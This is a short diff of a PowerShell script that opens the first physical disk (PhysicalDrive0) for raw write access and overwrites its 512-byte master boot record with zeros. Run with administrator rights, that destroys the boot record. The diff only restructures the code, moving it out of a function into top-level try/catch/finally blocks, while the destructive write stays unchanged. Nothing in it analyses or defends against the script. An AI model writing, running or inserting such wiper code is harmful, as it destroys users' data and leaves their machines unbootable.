@@ -1,21 +1,16 @@
 $MBR_SIZE = 512
 
-function Write-MBR {
+$MasterBootRecord = [System.IO.FileStream]::new("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
+
+try {
     $mbrData = New-Object byte[] $MBR_SIZE
-
-    $MasterBootRecord = [System.IO.FileStream]::new("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
-
-    try {
-        $MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
-        Start-Sleep -Milliseconds 5000
-        exit
-    }
-    catch {
-        # Handle the exception if needed
-    }
-    finally {
-        $MasterBootRecord.Close()
-    }
+    $MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
+    Start-Sleep -Seconds 5
+    Exit
 }
-
-Write-MBR
+catch {
+    # Exception handling code goes here
+}
+finally {
+    $MasterBootRecord.Close()
+}
